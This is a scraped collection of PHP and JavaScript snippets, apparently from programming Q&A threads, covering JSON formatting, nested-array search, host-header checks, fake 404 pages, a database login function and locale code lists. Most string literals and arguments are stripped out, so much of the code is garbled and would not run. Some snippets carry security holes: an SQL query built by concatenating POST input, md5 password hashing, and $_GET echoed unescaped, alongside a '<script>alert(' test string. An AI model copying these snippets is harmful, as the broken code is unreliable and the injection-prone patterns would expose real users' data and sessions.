<?php function json_readable_encode($in, $indent = 0, $from_array = false) { $_myself = __FUNCTION__; $_escape = function ($str) { return preg_replace("!([\b\t\n\r\f\"\\ }; $out = foreach ($in as $key=>$value) { $out .= str_repeat("\t", $indent + 1); $out .= "\"".$_escape((string)$key)."\": "; if (is_object($value) || is_array($value)) { $out .= "\n"; $out .= $_myself($value, $indent + 1); } elseif (is_bool($value)) { $out .= $value ? } elseif (is_null($value)) { $out .= } elseif (is_string($value)) { $out .= "\"" . $_escape($value) ."\""; } else { $out .= $value; } $out .= ",\n"; } if (!empty($out)) { $out = substr($out, 0, -2); } $out = str_repeat("\t", $indent) . "{\n" . $out; $out .= "\n" . str_repeat("\t", $indent) . "}"; return $out; } ?>
var js_json = json_encode($array); var js_json_string = JSON.stringify(js_json); var js_json_array = JSON.parse(js_json_string); alert(js_json_array.length);
$escape = function ( $string ) { return htmlspecialchars( (string) $string, ENT_QUOTES, }; $userText = "<script>alert( echo( "You entered {$escape( $userText )}" );
class Arr { public static function get( $array, $key, $default = null ) { return is_array( $array ) && array_key_exists( $key, $array ) ? $array[$key] : $default; } } $fn = array( var_dump( is_callable( $fn ) ); echo( "asd {$fn( array( 1 ), 0 )}" );
define( $FOO = FOO; $string = "I am too lazy to concatenate $FOO in my string";
define( $constants = create_function( echo "Hello, my name is {$constants(FOO)}";
define( $constants = get_defined_constants(true); $constants = $constants[ echo "Hello, my name is {$constants[
$constant = function($cons){ return constant($cons); };
define( $my_constant = MY_CONSTANT; echo "This is my constant: $my_constant";
define( printf( $my_string = sprintf( echo $my_string;
function constants(){ return array_change_key_case( get_defined_constants( true )[
extract( constants() ); $s = "I need to buy $bread, $eggs, and $milk from the store.";
function fill(){ $arr = func_get_args(); $s = $arr[ 0 ]; array_shift( $arr ); while( strpos( $s, $s = implode( current( $arr ), explode( } return $s; }
define("FOO","foo"); ${ echo "{$const(FOO)}"; echo const(FOO);
string preg_quote ( string $str [, string $delimiter = NULL ] )
$url = $escapedUrl = preg_quote($url, $regex = $haystack = "Bla bla http: preg_match($regex, $haystack, $matches); var_dump($matches);
$arr = array( 1 => "Value1", 2 => "Value2", 10 => "Value10" );
$keys = array_keys($arr); foreach($keys as $key) { echo($key); }
$array = array( $keys = array_keys($array); for($i=0; $i < count($keys); ++$i) { echo $keys[$i] . }
foreach ($array as $key => $value) { echo "<p>$key = $value</p>"; }
$foo = array( 1 => "Value1", 2 => "Value2", 10 => "Value10" ); while($bar = each($foo)){ echo $bar[0] . " => " . $bar[1]; }
<?php $arr = array( 1 => "Value1", 2 => "Value2", 10 => "Value10", ); foreach ($arr as $key => $val) { print "$key\n"; } ?>
<?php $names = array("firstname"=>"maurice", "lastname"=>"muteti", "contact"=>"7844433339"); foreach ($names as $name => $value) { echo $name." ".$value."</br>"; } print_r($names); ?>
$allowed_hosts = array( if (!isset($_SERVER[ header($_SERVER[ exit; }
function getHost() { $possibleHostSources = array( $sourceTransformations = array( "HTTP_X_FORWARDED_HOST" => function($value) { $elements = explode( return trim(end($elements)); } ); $host = foreach ($possibleHostSources as $source) { if (!empty($host)) break; if (empty($_SERVER[$source])) continue; $host = $_SERVER[$source]; if (array_key_exists($source, $sourceTransformations)) { $host = $sourceTransformations[$source]($host); } } $host = preg_replace( return trim($host); }
function get_host() { if ($host = $_SERVER[ { $elements = explode( $host = trim(end($elements)); } else { if (!$host = $_SERVER[ { if (!$host = $_SERVER[ { $host = !empty($_SERVER[ } } } $host = preg_replace( return trim($host); }
/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */ $reject_request = true; if(array_key_exists( $host_name = $_SERVER[ $strpos = strpos($host_name, if($strpos !== false){ $host_name = substr($host_name, $strpos); } $reject_request = !array_key_exists($host_name, array( )); } if($reject_request){ exit; } /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */ echo
if (strstr($_SERVER[ header( echo "<h1>404 Not Found</h1>"; echo "The page that you have requested could not be found."; exit(); }
<?php header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found"); header("Status: 404 Not Found"); $_SERVER[ ?> <!-- 404 contents below this line -->
header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found"); header("Status: 404 Not Found"); $_SERVER[ $handle = curl_init( curl_exec($handle);
if (strstr($_SERVER[ header( exit("<h1>404 Not Found</h1>\nThe page that you have requested could not be found."); }
if($_SERVER[ header( echo "<h1>404 Not Found</h1>"; echo "The page that you have requested could not be found."; die; }
if (strstr($_SERVER[ header( echo "<head><title>404 Not Found</title></head>"; echo "<h1>Not Found</h1>"; $uri = rtrim(dirname($_SERVER[ echo "<p>The requested URL ".$uri." was not found on this server.</p>"; exit(); }
$uri=$_SERVER[ $strpos=strpos($uri, if ($strpos!==false){ $e404="The page requested by you: &quot".$_SERVER[ $maybe=str_replace( $maybe=str_replace( die("<center><h1>404</h1><hr><h3>$e404</h3><h3>Maybe try <a href=$maybe>www.leaveyortexthere.p.ht/$maybe</a>?</center>"); }
Parse error: syntax error, unexpected end of file in the line
<html> <?php function login() { } if (login()) {?> <h2>Welcome Administrator</h2> <a href=\"upload.php\">Upload Files</a> <br /> <a href=\"points.php\">Edit Points Tally</a> <?php} else { echo "Incorrect login details. Please login"; } ?> Some more HTML code </html>
; short_open_tag = Off ; previous value short_open_tag = On ; new value
class someControler{ private $varr; public $varu; .. public function method { .. } .. }
if (login()) {?> <h2>Welcome Administrator</h2> <a href=\"upload.php\">Upload Files</a> <br /> <a href=\"points.php\">Edit Points Tally</a> <?php} else { echo "Incorrect login details. Please login"; }
<html> some code <?php function login() { if (empty ($_POST[ { return false; } if (empty ($_POST[ { return false; } $username = trim ($_POST[ $password = trim ($_POST[ $scrambled = md5 ($password . $link = mysqli_connect( if (!$link) { $error = "Unable to connect to the database server"; include exit (); } if (!mysqli_set_charset ($link, { $error = "Unable to set database connection encoding"; include exit (); } if (!mysqli_select_db ($link, { $error = "Unable to locate the foo database"; include exit (); } $sql = "SELECT COUNT(*) FROM admin WHERE username = $result = mysqli_query ($link, $sql); if (!$result) { return false; exit (); } $row = mysqli_fetch_array ($result); if ($row[0] > 0) { return true; } else { return false; } } if (login()) { echo <a href=\"upload.php\">Upload Files</a> <br /> <a href=\"points.php\">Edit Points Tally</a> } else { echo "Incorrect login details. Please login"; } ?> some more html code </html>
$arr = array(0 => array(id=>1,name=>"cat 1"), 1 => array(id=>2,name=>"cat 2"), 2 => array(id=>3,name=>"cat 1") );
array(0 => array(id=>1,name=>"cat 1"), 1 => array(id=>3,name=>"cat 1") );
function search($array, $key, $value) { $results = array(); if (is_array($array)) { if (isset($array[$key]) && $array[$key] == $value) { $results[] = $array; } foreach ($array as $subarray) { $results = array_merge($results, search($subarray, $key, $value)); } } return $results; } $arr = array(0 => array(id=>1,name=>"cat 1"), 1 => array(id=>2,name=>"cat 2"), 2 => array(id=>3,name=>"cat 1")); print_r(search($arr,
Array ( [0] => Array ( [id] => 1 [name] => cat 1 ) [1] => Array ( [id] => 3 [name] => cat 1 ) )
function search($array, $key, $value) { $results = array(); search_r($array, $key, $value, $results); return $results; } function search_r($array, $key, $value, &$results) { if (!is_array($array)) { return; } if (isset($array[$key]) && $array[$key] == $value) { $results[] = $array; } foreach ($array as $subarray) { search_r($subarray, $key, $value, $results); } }
$arr = array(0 => array( 1 => array(array( 2 => array( ); $arrIt = new RecursiveIteratorIterator(new RecursiveArrayIterator($arr)); foreach ($arrIt as $sub) { $subArray = $arrIt->getSubIterator(); if ($subArray[ $outputArray[] = iterator_to_array($subArray); } }
<?php $arr = array(0 => array("id"=>1,"name"=>"cat 1"), 1 => array("id"=>2,"name"=>"cat 2"), 2 => array("id"=>3,"name"=>"cat 1") ); $arr = array_filter($arr, function($ar) { return ($ar[ }); echo "<pre>"; print_r($arr); ?>
public function searchSubArray(Array $array, $key, $value) { foreach ($array as $subarray){ if (isset($subarray[$key]) && $subarray[$key] == $value) return $subarray; } }
array( [0] => array ([0] => something, [1] => something_else)) ... [100] => array ([0] => something100, [1] => something_else100)) )
ArrayObject( MyObject(something, something_else)) ... MyObject(something100, something_else100)) )
interface Comparable { public function compareTo(Comparable $o); } class MyObject implements Comparable { public function compareTo(Comparable $o){ ... } } function myComp(Comparable $a, Comparable $b){ return $a->compareTo($b); }
$result = array_filter($arr, function ($var) { $found = false; array_walk_recursive($var, function ($item, $key) use (&$found) { $found = $found || $key == "name" && $item == "cat 1"; }); return $found; });
<?php function searchNestedArray(array $array, $search, $mode = foreach (new RecursiveIteratorIterator(new RecursiveArrayIterator($array)) as $key => $value) { if ($search === ${${"mode"}}) return true; } return false; } $data = array( array( array( ); var_dump(searchNestedArray($data, 555));
function in_multi_array($needle, $key, $haystack) { $in_multi_array = false; if (in_array($needle, $haystack)) { $in_multi_array = true; }else { foreach( $haystack as $key1 => $val ) { if(is_array($val)) { if($this->in_multi_array($needle, $key, $val)) { $in_multi_array = true; break; } } } } return $in_multi_array; }
function _search_array_by_value($array, $value) { $results = array(); if (is_array($array)) { $found = array_search($value,$array); if ($found) { $results[] = $found; } foreach ($array as $subarray) $results = array_merge($results, $this->_search_array_by_value($subarray, $value)); } return $results; }
function search_array ( $array, $key, $value ) { $results = array(); if ( is_array($array) ) { if ( $array[$key] == $value ) { $results[] = $array; } else { foreach ($array as $subarray) $results = array_merge( $results, $this->search_array($subarray, $key, $value) ); } } return $results; } $arr = array(0 => array(id=>1,name=>"cat 1"), 1 => array(id=>2,name=>"cat 2"), 2 => array(id=>3,name=>"cat 1")); print_r(search_array($arr,
<?php $students[ $students[ $students[ $students[ $key = array_search( echo $key; ?>
$arr[ $arr[ print_r(search_array($arr, function search_array($array, $key, $value) { $return = array(); foreach ($array as $k=>$subarray){ if (isset($subarray[$key]) && $subarray[$key] == $value) { $return[$k] = $subarray; return $return; } } }
function findKey($tab, $key){ foreach($tab as $k => $value){ if($k==$key) return $value; if(is_array($value)){ $find = findKey($value, $key); if($find) return $find; } } return null; }
public function scopeIdDescending($query) { return $query->orderBy( }
echo filter_input(INPUT_GET,"link",FILTER_SANITIZE_STRING);
$parameter = $_SERVER[ echo $parameter; or Just use echo $_GET[
$Query_String = explode("&", explode("?", $_SERVER[ var_dump($Query_String)
<html> <head></head> <body> <?php echo $_GET[ ?> <body> </html>
sudo apt-get install php7.0-curl sudo apt-get install php7.0-dom sudo apt-get install php7.0-mcrypt sudo apt-get install php7.0-simplexml sudo apt-get install php7.0-spl sudo apt-get install php7.0-xsl sudo apt-get install php7.0-intl sudo apt-get install php7.0-mbstring sudo apt-get install php7.0-ctype sudo apt-get install php7.0-hash sudo apt-get install php7.0-openssl sudo apt-get install php7.0-zip sudo apt-get install php7.0-xmlwriter sudo apt-get install php7.0-gd sudo apt-get install php7.0-iconv
sudo add-apt-repository main sudo add-apt-repository universe sudo add-apt-repository restricted sudo add-apt-repository multiverse sudo add-apt-repository ppa:ondrej/php sudo apt-get update sudo apt-get install php-curl
af-ZA am-ET ar-AE ar-BH ar-DZ ar-EG ar-IQ ar-JO ar-KW ar-LB ar-LY ar-MA arn-CL ar-OM ar-QA ar-SA ar-SY ar-TN ar-YE as-IN az-Cyrl-AZ az-Latn-AZ ba-RU be-BY bg-BG bn-BD bn-IN bo-CN br-FR bs-Cyrl-BA bs-Latn-BA ca-ES co-FR cs-CZ cy-GB da-DK de-AT de-CH de-DE de-LI de-LU dsb-DE dv-MV el-GR en-029 en-AU en-BZ en-CA en-GB en-IE en-IN en-JM en-MY en-NZ en-PH en-SG en-TT en-US en-ZA en-ZW es-AR es-BO es-CL es-CO es-CR es-DO es-EC es-ES es-GT es-HN es-MX es-NI es-PA es-PE es-PR es-PY es-SV es-US es-UY es-VE et-EE eu-ES fa-IR fi-FI fil-PH fo-FO fr-BE fr-CA fr-CH fr-FR fr-LU fr-MC fy-NL ga-IE gd-GB gl-ES gsw-FR gu-IN ha-Latn-NG he-IL hi-IN hr-BA hr-HR hsb-DE hu-HU hy-AM id-ID ig-NG ii-CN is-IS it-CH it-IT iu-Cans-CA iu-Latn-CA ja-JP ka-GE kk-KZ kl-GL km-KH kn-IN kok-IN ko-KR ky-KG lb-LU lo-LA lt-LT lv-LV mi-NZ mk-MK ml-IN mn-MN mn-Mong-CN moh-CA mr-IN ms-BN ms-MY mt-MT nb-NO ne-NP nl-BE nl-NL nn-NO nso-ZA oc-FR or-IN pa-IN pl-PL prs-AF ps-AF pt-BR pt-PT qut-GT quz-BO quz-EC quz-PE rm-CH ro-RO ru-RU rw-RW sah-RU sa-IN se-FI se-NO se-SE si-LK sk-SK sl-SI sma-NO sma-SE smj-NO smj-SE smn-FI sms-FI sq-AL sr-Cyrl-BA sr-Cyrl-CS sr-Cyrl-ME sr-Cyrl-RS sr-Latn-BA sr-Latn-CS sr-Latn-ME sr-Latn-RS sv-FI sv-SE sw-KE syr-SY ta-IN te-IN tg-Cyrl-TJ th-TH tk-TM tn-ZA tr-TR tt-RU tzm-Latn-DZ ug-CN uk-UA ur-PK uz-Cyrl-UZ uz-Latn-UZ vi-VN wo-SN xh-ZA yo-NG zh-CN zh-HK zh-MO zh-SG zh-TW zu-ZA
var LANGUAGE_BY_LOCALE = { af_NA: "Afrikaans (Namibia)", af_ZA: "Afrikaans (South Africa)", af: "Afrikaans", ak_GH: "Akan (Ghana)", ak: "Akan", sq_AL: "Albanian (Albania)", sq: "Albanian", am_ET: "Amharic (Ethiopia)", am: "Amharic", ar_DZ: "Arabic (Algeria)", ar_BH: "Arabic (Bahrain)", ar_EG: "Arabic (Egypt)", ar_IQ: "Arabic (Iraq)", ar_JO: "Arabic (Jordan)", ar_KW: "Arabic (Kuwait)", ar_LB: "Arabic (Lebanon)", ar_LY: "Arabic (Libya)", ar_MA: "Arabic (Morocco)", ar_OM: "Arabic (Oman)", ar_QA: "Arabic (Qatar)", ar_SA: "Arabic (Saudi Arabia)", ar_SD: "Arabic (Sudan)", ar_SY: "Arabic (Syria)", ar_TN: "Arabic (Tunisia)", ar_AE: "Arabic (United Arab Emirates)", ar_YE: "Arabic (Yemen)", ar: "Arabic", hy_AM: "Armenian (Armenia)", hy: "Armenian", as_IN: "Assamese (India)", as: "Assamese", asa_TZ: "Asu (Tanzania)", asa: "Asu", az_Cyrl: "Azerbaijani (Cyrillic)", az_Cyrl_AZ: "Azerbaijani (Cyrillic, Azerbaijan)", az_Latn: "Azerbaijani (Latin)", az_Latn_AZ: "Azerbaijani (Latin, Azerbaijan)", az: "Azerbaijani", bm_ML: "Bambara (Mali)", bm: "Bambara", eu_ES: "Basque (Spain)", eu: "Basque", be_BY: "Belarusian (Belarus)", be: "Belarusian", bem_ZM: "Bemba (Zambia)", bem: "Bemba", bez_TZ: "Bena (Tanzania)", bez: "Bena", bn_BD: "Bengali (Bangladesh)", bn_IN: "Bengali (India)", bn: "Bengali", bs_BA: "Bosnian (Bosnia and Herzegovina)", bs: "Bosnian", bg_BG: "Bulgarian (Bulgaria)", bg: "Bulgarian", my_MM: "Burmese (Myanmar [Burma])", my: "Burmese", ca_ES: "Catalan (Spain)", ca: "Catalan", tzm_Latn: "Central Morocco Tamazight (Latin)", tzm_Latn_MA: "Central Morocco Tamazight (Latin, Morocco)", tzm: "Central Morocco Tamazight", chr_US: "Cherokee (United States)", chr: "Cherokee", cgg_UG: "Chiga (Uganda)", cgg: "Chiga", zh_Hans: "Chinese (Simplified Han)", zh_Hans_CN: "Chinese (Simplified Han, China)", zh_Hans_HK: "Chinese (Simplified Han, Hong Kong SAR China)", zh_Hans_MO: "Chinese (Simplified Han, Macau SAR China)", zh_Hans_SG: "Chinese (Simplified Han, Singapore)", zh_Hant: "Chinese (Traditional Han)", zh_Hant_HK: "Chinese (Traditional Han, Hong Kong SAR China)", zh_Hant_MO: "Chinese (Traditional Han, Macau SAR China)", zh_Hant_TW: "Chinese (Traditional Han, Taiwan)", zh: "Chinese", kw_GB: "Cornish (United Kingdom)", kw: "Cornish", hr_HR: "Croatian (Croatia)", hr: "Croatian", cs_CZ: "Czech (Czech Republic)", cs: "Czech", da_DK: "Danish (Denmark)", da: "Danish", nl_BE: "Dutch (Belgium)", nl_NL: "Dutch (Netherlands)", nl: "Dutch", ebu_KE: "Embu (Kenya)", ebu: "Embu", en_AS: "English (American Samoa)", en_AU: "English (Australia)", en_BE: "English (Belgium)", en_BZ: "English (Belize)", en_BW: "English (Botswana)", en_CA: "English (Canada)", en_GU: "English (Guam)", en_HK: "English (Hong Kong SAR China)", en_IN: "English (India)", en_IE: "English (Ireland)", en_IL: "English (Israel)", en_JM: "English (Jamaica)", en_MT: "English (Malta)", en_MH: "English (Marshall Islands)", en_MU: "English (Mauritius)", en_NA: "English (Namibia)", en_NZ: "English (New Zealand)", en_MP: "English (Northern Mariana Islands)", en_PK: "English (Pakistan)", en_PH: "English (Philippines)", en_SG: "English (Singapore)", en_ZA: "English (South Africa)", en_TT: "English (Trinidad and Tobago)", en_UM: "English (U.S. Minor Outlying Islands)", en_VI: "English (U.S. Virgin Islands)", en_GB: "English (United Kingdom)", en_US: "English (United States)", en_ZW: "English (Zimbabwe)", en: "English", eo: "Esperanto", et_EE: "Estonian (Estonia)", et: "Estonian", ee_GH: "Ewe (Ghana)", ee_TG: "Ewe (Togo)", ee: "Ewe", fo_FO: "Faroese (Faroe Islands)", fo: "Faroese", fil_PH: "Filipino (Philippines)", fil: "Filipino", fi_FI: "Finnish (Finland)", fi: "Finnish", fr_BE: "French (Belgium)", fr_BJ: "French (Benin)", fr_BF: "French (Burkina Faso)", fr_BI: "French (Burundi)", fr_CM: "French (Cameroon)", fr_CA: "French (Canada)", fr_CF: "French (Central African Republic)", fr_TD: "French (Chad)", fr_KM: "French (Comoros)", fr_CG: "French (Congo - Brazzaville)", fr_CD: "French (Congo - Kinshasa)", fr_CI: "French (Côte d’Ivoire)", fr_DJ: "French (Djibouti)", fr_GQ: "French (Equatorial Guinea)", fr_FR: "French (France)", fr_GA: "French (Gabon)", fr_GP: "French (Guadeloupe)", fr_GN: "French (Guinea)", fr_LU: "French (Luxembourg)", fr_MG: "French (Madagascar)", fr_ML: "French (Mali)", fr_MQ: "French (Martinique)", fr_MC: "French (Monaco)", fr_NE: "French (Niger)", fr_RW: "French (Rwanda)", fr_RE: "French (Réunion)", fr_BL: "French (Saint Barthélemy)", fr_MF: "French (Saint Martin)", fr_SN: "French (Senegal)", fr_CH: "French (Switzerland)", fr_TG: "French (Togo)", fr: "French", ff_SN: "Fulah (Senegal)", ff: "Fulah", gl_ES: "Galician (Spain)", gl: "Galician", lg_UG: "Ganda (Uganda)", lg: "Ganda", ka_GE: "Georgian (Georgia)", ka: "Georgian", de_AT: "German (Austria)", de_BE: "German (Belgium)", de_DE: "German (Germany)", de_LI: "German (Liechtenstein)", de_LU: "German (Luxembourg)", de_CH: "German (Switzerland)", de: "German", el_CY: "Greek (Cyprus)", el_GR: "Greek (Greece)", el: "Greek", gu_IN: "Gujarati (India)", gu: "Gujarati", guz_KE: "Gusii (Kenya)", guz: "Gusii", ha_Latn: "Hausa (Latin)", ha_Latn_GH: "Hausa (Latin, Ghana)", ha_Latn_NE: "Hausa (Latin, Niger)", ha_Latn_NG: "Hausa (Latin, Nigeria)", ha: "Hausa", haw_US: "Hawaiian (United States)", haw: "Hawaiian", he_IL: "Hebrew (Israel)", he: "Hebrew", hi_IN: "Hindi (India)", hi: "Hindi", hu_HU: "Hungarian (Hungary)", hu: "Hungarian", is_IS: "Icelandic (Iceland)", is: "Icelandic", ig_NG: "Igbo (Nigeria)", ig: "Igbo", id_ID: "Indonesian (Indonesia)", id: "Indonesian", ga_IE: "Irish (Ireland)", ga: "Irish", it_IT: "Italian (Italy)", it_CH: "Italian (Switzerland)", it: "Italian", ja_JP: "Japanese (Japan)", ja: "Japanese", kea_CV: "Kabuverdianu (Cape Verde)", kea: "Kabuverdianu", kab_DZ: "Kabyle (Algeria)", kab: "Kabyle", kl_GL: "Kalaallisut (Greenland)", kl: "Kalaallisut", kln_KE: "Kalenjin (Kenya)", kln: "Kalenjin", kam_KE: "Kamba (Kenya)", kam: "Kamba", kn_IN: "Kannada (India)", kn: "Kannada", kk_Cyrl: "Kazakh (Cyrillic)", kk_Cyrl_KZ: "Kazakh (Cyrillic, Kazakhstan)", kk: "Kazakh", km_KH: "Khmer (Cambodia)", km: "Khmer", ki_KE: "Kikuyu (Kenya)", ki: "Kikuyu", rw_RW: "Kinyarwanda (Rwanda)", rw: "Kinyarwanda", kok_IN: "Konkani (India)", kok: "Konkani", ko_KR: "Korean (South Korea)", ko: "Korean", khq_ML: "Koyra Chiini (Mali)", khq: "Koyra Chiini", ses_ML: "Koyraboro Senni (Mali)", ses: "Koyraboro Senni", lag_TZ: "Langi (Tanzania)", lag: "Langi", lv_LV: "Latvian (Latvia)", lv: "Latvian", lt_LT: "Lithuanian (Lithuania)", lt: "Lithuanian", luo_KE: "Luo (Kenya)", luo: "Luo", luy_KE: "Luyia (Kenya)", luy: "Luyia", mk_MK: "Macedonian (Macedonia)", mk: "Macedonian", jmc_TZ: "Machame (Tanzania)", jmc: "Machame", kde_TZ: "Makonde (Tanzania)", kde: "Makonde", mg_MG: "Malagasy (Madagascar)", mg: "Malagasy", ms_BN: "Malay (Brunei)", ms_MY: "Malay (Malaysia)", ms: "Malay", ml_IN: "Malayalam (India)", ml: "Malayalam", mt_MT: "Maltese (Malta)", mt: "Maltese", gv_GB: "Manx (United Kingdom)", gv: "Manx", mr_IN: "Marathi (India)", mr: "Marathi", mas_KE: "Masai (Kenya)", mas_TZ: "Masai (Tanzania)", mas: "Masai", mer_KE: "Meru (Kenya)", mer: "Meru", mfe_MU: "Morisyen (Mauritius)", mfe: "Morisyen", naq_NA: "Nama (Namibia)", naq: "Nama", ne_IN: "Nepali (India)", ne_NP: "Nepali (Nepal)", ne: "Nepali", nd_ZW: "North Ndebele (Zimbabwe)", nd: "North Ndebele", nb_NO: "Norwegian Bokmål (Norway)", nb: "Norwegian Bokmål", nn_NO: "Norwegian Nynorsk (Norway)", nn: "Norwegian Nynorsk", nyn_UG: "Nyankole (Uganda)", nyn: "Nyankole", or_IN: "Oriya (India)", or: "Oriya", om_ET: "Oromo (Ethiopia)", om_KE: "Oromo (Kenya)", om: "Oromo", ps_AF: "Pashto (Afghanistan)", ps: "Pashto", fa_AF: "Persian (Afghanistan)", fa_IR: "Persian (Iran)", fa: "Persian", pl_PL: "Polish (Poland)", pl: "Polish", pt_BR: "Portuguese (Brazil)", pt_GW: "Portuguese (Guinea-Bissau)", pt_MZ: "Portuguese (Mozambique)", pt_PT: "Portuguese (Portugal)", pt: "Portuguese", pa_Arab: "Punjabi (Arabic)", pa_Arab_PK: "Punjabi (Arabic, Pakistan)", pa_Guru: "Punjabi (Gurmukhi)", pa_Guru_IN: "Punjabi (Gurmukhi, India)", pa: "Punjabi", ro_MD: "Romanian (Moldova)", ro_RO: "Romanian (Romania)", ro: "Romanian", rm_CH: "Romansh (Switzerland)", rm: "Romansh", rof_TZ: "Rombo (Tanzania)", rof: "Rombo", ru_MD: "Russian (Moldova)", ru_RU: "Russian (Russia)", ru_UA: "Russian (Ukraine)", ru: "Russian", rwk_TZ: "Rwa (Tanzania)", rwk: "Rwa", saq_KE: "Samburu (Kenya)", saq: "Samburu", sg_CF: "Sango (Central African Republic)", sg: "Sango", seh_MZ: "Sena (Mozambique)", seh: "Sena", sr_Cyrl: "Serbian (Cyrillic)", sr_Cyrl_BA: "Serbian (Cyrillic, Bosnia and Herzegovina)", sr_Cyrl_ME: "Serbian (Cyrillic, Montenegro)", sr_Cyrl_RS: "Serbian (Cyrillic, Serbia)", sr_Latn: "Serbian (Latin)", sr_Latn_BA: "Serbian (Latin, Bosnia and Herzegovina)", sr_Latn_ME: "Serbian (Latin, Montenegro)", sr_Latn_RS: "Serbian (Latin, Serbia)", sr: "Serbian", sn_ZW: "Shona (Zimbabwe)", sn: "Shona", ii_CN: "Sichuan Yi (China)", ii: "Sichuan Yi", si_LK: "Sinhala (Sri Lanka)", si: "Sinhala", sk_SK: "Slovak (Slovakia)", sk: "Slovak", sl_SI: "Slovenian (Slovenia)", sl: "Slovenian", xog_UG: "Soga (Uganda)", xog: "Soga", so_DJ: "Somali (Djibouti)", so_ET: "Somali (Ethiopia)", so_KE: "Somali (Kenya)", so_SO: "Somali (Somalia)", so: "Somali", es_AR: "Spanish (Argentina)", es_BO: "Spanish (Bolivia)", es_CL: "Spanish (Chile)", es_CO: "Spanish (Colombia)", es_CR: "Spanish (Costa Rica)", es_DO: "Spanish (Dominican Republic)", es_EC: "Spanish (Ecuador)", es_SV: "Spanish (El Salvador)", es_GQ: "Spanish (Equatorial Guinea)", es_GT: "Spanish (Guatemala)", es_HN: "Spanish (Honduras)", es_419: "Spanish (Latin America)", es_MX: "Spanish (Mexico)", es_NI: "Spanish (Nicaragua)", es_PA: "Spanish (Panama)", es_PY: "Spanish (Paraguay)", es_PE: "Spanish (Peru)", es_PR: "Spanish (Puerto Rico)", es_ES: "Spanish (Spain)", es_US: "Spanish (United States)", es_UY: "Spanish (Uruguay)", es_VE: "Spanish (Venezuela)", es: "Spanish", sw_KE: "Swahili (Kenya)", sw_TZ: "Swahili (Tanzania)", sw: "Swahili", sv_FI: "Swedish (Finland)", sv_SE: "Swedish (Sweden)", sv: "Swedish", gsw_CH: "Swiss German (Switzerland)", gsw: "Swiss German", shi_Latn: "Tachelhit (Latin)", shi_Latn_MA: "Tachelhit (Latin, Morocco)", shi_Tfng: "Tachelhit (Tifinagh)", shi_Tfng_MA: "Tachelhit (Tifinagh, Morocco)", shi: "Tachelhit", dav_KE: "Taita (Kenya)", dav: "Taita", ta_IN: "Tamil (India)", ta_LK: "Tamil (Sri Lanka)", ta: "Tamil", te_IN: "Telugu (India)", te: "Telugu", teo_KE: "Teso (Kenya)", teo_UG: "Teso (Uganda)", teo: "Teso", th_TH: "Thai (Thailand)", th: "Thai", bo_CN: "Tibetan (China)", bo_IN: "Tibetan (India)", bo: "Tibetan", ti_ER: "Tigrinya (Eritrea)", ti_ET: "Tigrinya (Ethiopia)", ti: "Tigrinya", to_TO: "Tonga (Tonga)", to: "Tonga", tr_TR: "Turkish (Turkey)", tr: "Turkish", uk_UA: "Ukrainian (Ukraine)", uk: "Ukrainian", ur_IN: "Urdu (India)", ur_PK: "Urdu (Pakistan)", ur: "Urdu", uz_Arab: "Uzbek (Arabic)", uz_Arab_AF: "Uzbek (Arabic, Afghanistan)", uz_Cyrl: "Uzbek (Cyrillic)", uz_Cyrl_UZ: "Uzbek (Cyrillic, Uzbekistan)", uz_Latn: "Uzbek (Latin)", uz_Latn_UZ: "Uzbek (Latin, Uzbekistan)", uz: "Uzbek", vi_VN: "Vietnamese (Vietnam)", vi: "Vietnamese", vun_TZ: "Vunjo (Tanzania)", vun: "Vunjo", cy_GB: "Welsh (United Kingdom)", cy: "Welsh", yo_NG: "Yoruba (Nigeria)", yo: "Yoruba", yue_Hant_HK: "Cantonese (Traditional, Hong Kong SAR China)" zu_ZA: "Zulu (South Africa)", zu: "Zulu" }
aa_DJ.UTF-8 UTF-8 aa_DJ ISO-8859-1 aa_ER UTF-8 aa_ER@saaho UTF-8 aa_ET UTF-8 af_ZA.UTF-8 UTF-8 af_ZA ISO-8859-1 am_ET UTF-8 an_ES.UTF-8 UTF-8 an_ES ISO-8859-15 ar_AE.UTF-8 UTF-8 ar_AE ISO-8859-6 ar_BH.UTF-8 UTF-8 ar_BH ISO-8859-6 ar_DZ.UTF-8 UTF-8 ar_DZ ISO-8859-6 ar_EG.UTF-8 UTF-8 ar_EG ISO-8859-6 ar_IN UTF-8 ar_IQ.UTF-8 UTF-8 ar_IQ ISO-8859-6 ar_JO.UTF-8 UTF-8 ar_JO ISO-8859-6 ar_KW.UTF-8 UTF-8 ar_KW ISO-8859-6 ar_LB.UTF-8 UTF-8 ar_LB ISO-8859-6 ar_LY.UTF-8 UTF-8 ar_LY ISO-8859-6 ar_MA.UTF-8 UTF-8 ar_MA ISO-8859-6 ar_OM.UTF-8 UTF-8 ar_OM ISO-8859-6 ar_QA.UTF-8 UTF-8 ar_QA ISO-8859-6 ar_SA.UTF-8 UTF-8 ar_SA ISO-8859-6 ar_SD.UTF-8 UTF-8 ar_SD ISO-8859-6 ar_SY.UTF-8 UTF-8 ar_SY ISO-8859-6 ar_TN.UTF-8 UTF-8 ar_TN ISO-8859-6 ar_YE.UTF-8 UTF-8 ar_YE ISO-8859-6 az_AZ UTF-8 as_IN UTF-8 ast_ES.UTF-8 UTF-8 ast_ES ISO-8859-15 be_BY.UTF-8 UTF-8 be_BY CP1251 be_BY@latin UTF-8 bem_ZM UTF-8 ber_DZ UTF-8 ber_MA UTF-8 bg_BG.UTF-8 UTF-8 bg_BG CP1251 bho_IN UTF-8 bn_BD UTF-8 bn_IN UTF-8 bo_CN UTF-8 bo_IN UTF-8 br_FR.UTF-8 UTF-8 br_FR ISO-8859-1 br_FR@euro ISO-8859-15 brx_IN UTF-8 bs_BA.UTF-8 UTF-8 bs_BA ISO-8859-2 byn_ER UTF-8 ca_AD.UTF-8 UTF-8 ca_AD ISO-8859-15 ca_ES.UTF-8 UTF-8 ca_ES ISO-8859-1 ca_ES@euro ISO-8859-15 ca_FR.UTF-8 UTF-8 ca_FR ISO-8859-15 ca_IT.UTF-8 UTF-8 ca_IT ISO-8859-15 crh_UA UTF-8 cs_CZ.UTF-8 UTF-8 cs_CZ ISO-8859-2 csb_PL UTF-8 cv_RU UTF-8 cy_GB.UTF-8 UTF-8 cy_GB ISO-8859-14 da_DK.UTF-8 UTF-8 da_DK ISO-8859-1 de_AT.UTF-8 UTF-8 de_AT ISO-8859-1 de_AT@euro ISO-8859-15 de_BE.UTF-8 UTF-8 de_BE ISO-8859-1 